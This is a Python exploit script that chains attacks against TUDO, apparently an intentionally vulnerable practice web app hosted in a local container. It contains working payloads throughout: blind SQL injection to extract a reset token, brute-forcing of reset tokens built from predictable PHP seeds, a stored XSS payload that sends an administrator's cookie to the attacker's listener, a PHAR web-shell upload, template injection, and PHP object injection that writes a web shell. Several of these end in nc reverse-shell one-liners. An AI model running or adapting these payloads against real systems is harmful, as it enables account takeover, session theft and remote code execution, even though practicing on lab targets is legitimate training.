#!/usr/bin/python3

# @title  TUDO Exploitation Script (https://github.com/bmdyy/tudo/)
# @author Rezur (Amit Roy)

import requests,string,sys,threading,codecs,time,subprocess,os
from base64 import b64encode, b64decode, urlsafe_b64encode, urlsafe_b64decode
from http.server import HTTPServer, BaseHTTPRequestHandler
from http import cookies

r = requests.Session()
proxies = {'http': 'http://127.0.0.1:8080'}

base_path = "http://172.17.0.2"
index_path = "/index.php"
resetPassword_path = "/forgotpassword.php"
resetUsername_path = "/forgotusername.php"
newPassword_path = "/resetpassword.php"
changeDescription_path = "/profile.php"
login_path = "/login.php"
uploadImage_path = "/admin/upload_image.php"
shellUpload_path = "/images/shell.phar"
templateInjection_path = "/admin/update_motd.php"
objectInjection_path = "/admin/import_user.php"


def generate_token(username):
    data = {"username" : username}
    request_start_time = unix_timestamp()
    response = r.post(base_path+resetPassword_path, data=data)
    request_end_time = unix_timestamp()
    print("[*] Password Reset Request Sent" if "Email" in response.text else "[!] Reset Request Failed")
    return request_start_time, request_end_time

def char_extract(payload):
    data = {"username" : payload}
    response = r.post(base_path+resetUsername_path, data=data)
    if "color:green" in response.text:
        return True
    else:
        return False

def uid_extract(username):
    charset = string.digits
    uid = ""
    for char in charset:
        payload = "admin' and %s = (select uid from users where username='%s');--" % (str(char),username)
        if char_extract(payload):
            uid += char
            break
    print("[*] UID:",uid)
    return uid

def token_extract(username):
    charset = string.printable
    token_length = 32
    token = ""
    uid = str(uid_extract(username))
    for i in range(token_length):
        for char in charset:
            #payload = "admin' and CHR(%s) = (select substr(version(),%s,1));--" % (ord(str(char)),str(i+1))
            payload = "admin' and CHR(%s) = (select substr(token,%s,1) from tokens where uid=%s limit 1);--" % (ord(str(char)),str(i+1),uid)
            sys.stdout.write(f"\r[*] Password Reset Token: {token + char}\r")
            if char_extract(payload):
                token += char
                break
    print("[*] Password Reset Token:",token)
    return token

def set_password(token, password):
    data = {"token" : token, "password1": password, "password2": password}
    response = r.post(base_path+newPassword_path, data=data)
    print("[*] Password was changed to '%s'" % password if "Password changed" in response.text else "[!] Password did not Reset")

def login_user(username, password):
    data = {"username": username, "password": password}
    response = r.post(base_path+login_path, data=data)
    print("[*] Logged in as: %s" % (username) if "All Posts" in response.text else "[!] Login Failed")
   
def send_xss_payload():
    payload = "<script>   var img = new Image();   img.src = 'http://172.17.0.1:8000/?cookie=' + btoa(document.cookie); </script>"
    data = {"description" : payload}
    response = r.post(base_path+changeDescription_path, data=data)
    print("[*] XSS Payload Submitted. Waiting for Admin to trigger" if "Success" in response.text else "[!] XSS Payload submission failed")

xss_event = threading.Event() # Signifies when victim sends their cookie
lhost      = "0.0.0.0"
web_port   = 8000
def start_web_server():
    class MyHandler(BaseHTTPRequestHandler):

        def do_GET(self):
            self.send_response(200)
            self.end_headers()

            # Load stolen cookie into session
            _, enc_cookie = self.path.split("/?cookie=", 1)
            plain_cookie = urlsafe_b64decode(enc_cookie).decode()
            r.cookies.clear()
            r.cookies["PHPSESSID"] = cookies.SimpleCookie(plain_cookie)["PHPSESSID"]

            xss_event.set() # Trigger the event
            
    httpd = HTTPServer((lhost, web_port), MyHandler)
    threading.Thread(target=httpd.serve_forever).start()

def upload_trigger_phar_shell():
    payload_str = 'GIF89a<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f");?>' % (shell_host, shell_port)
    payload_bytes = codecs.encode(payload_str, 'utf-8')
    files = {"image": ("shell.phar", payload_bytes, "image/gif")}
    response = r.post(base_path+uploadImage_path, files=files, proxies=proxies, allow_redirects=False)
    print("[*] Shell Uploaded" if "Success" in response.text else "[!] Shell Upload Failed")
    time.sleep(0.1)
    response = r.get(base_path+shellUpload_path)
    print("[*] PHAR Shell Triggered" if "200" == str(response.status_code) else "[!] Shell not found")

def template_injection():
    payload = "{php}echo `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f`;{/php}" % (shell_host, shell_port)
    data = {"message": payload}
    response = r.post(base_path+templateInjection_path, data=data)
    print("[*] SSTI Payload Injected" if "Message set" in response.text else "[!] SSTI Payload not set")
    print("[*] SSTI Payload Triggered")
    response = r.get(base_path+index_path)

def unix_timestamp():
	return int(time.time()*1000)

def php_token_generation_pwreset(password, s_time, e_time):
    print("[*] Maximum number of requests needed for reset: %s" % (e_time-s_time))
    genToken_phpfile = """
<?php
    function generateToken($seed) {
        srand($seed);
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
        $ret = '';
        for ($i = 0; $i < 32; $i++) {
            $ret .= $chars[rand(0,strlen($chars)-1)];
        }
        return $ret;
    }
    $seed = $argv[1];
    $token = generateToken($seed);
    echo($token);
?>
"""
    f = open("genToken.php", "w")
    f.write(genToken_phpfile)
    f.close()
    print("[*] Wrote 'genToken.php' in current directory")
    for i in range(s_time,e_time):
        token = subprocess.run(["php", "genToken.php",str(i)], capture_output=True, text=True).stdout.strip()
        data = {"token" : token, "password1": password, "password2": password}
        response = r.post(base_path+newPassword_path, data=data)
        if "Password changed" in response.text:
            print("[*] Password changed with token: %s on request no. %s" % (token, i-s_time))
            break
    os.remove("genToken.php")
    return token
    
def php_object_injection():
    payload = 'O:3:"Log":2:{s:1:"f";s:33:"/var/www/html/images/poishell.php";s:1:"m";s:29:"<?php system($_GET["cmd"]);?>";}'
    data = {"userobj": payload}
    response = r.post(base_path+objectInjection_path, data=data, allow_redirects=False)
    print("[*] Object Injected" if "302" == str(response.status_code) else "[!] Object Injection Error")
    payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f' % (shell_host, shell_port)
    params = {"cmd": payload}
    response = r.get(base_path+"/images/poishell.php", params=params)
    print("[*] Shell Triggered" if "200" == str(response.status_code) else "[!] Shell not found")


if __name__ == "__main__":
    username = 'user1'
    new_password = 'monkas'
    shell_host = "172.17.0.1"
    shell_port = "9001"    
    timestamps = generate_token(username)
    php_token_generation_pwreset(new_password, timestamps[0], timestamps[1])
    #reset_token = token_extract(username)
    #set_password(reset_token, new_password)
    login_user(username, new_password)
    start_web_server()
    send_xss_payload()
    xss_event.wait() # Wait for event to be triggered
    print("[*] Stolen cookie:", r.cookies["PHPSESSID"])
    print("[*] Logged in as Admin" if "Admin Section" in r.get(base_path+index_path).text else "[!] Login Failed")
    print("[*] Reverse Shell will be sent to %s:%s (nc needed in target for reverse shell)" % (shell_host, shell_port))
    #upload_trigger_phar_shell()
    #template_injection()
    php_object_injection()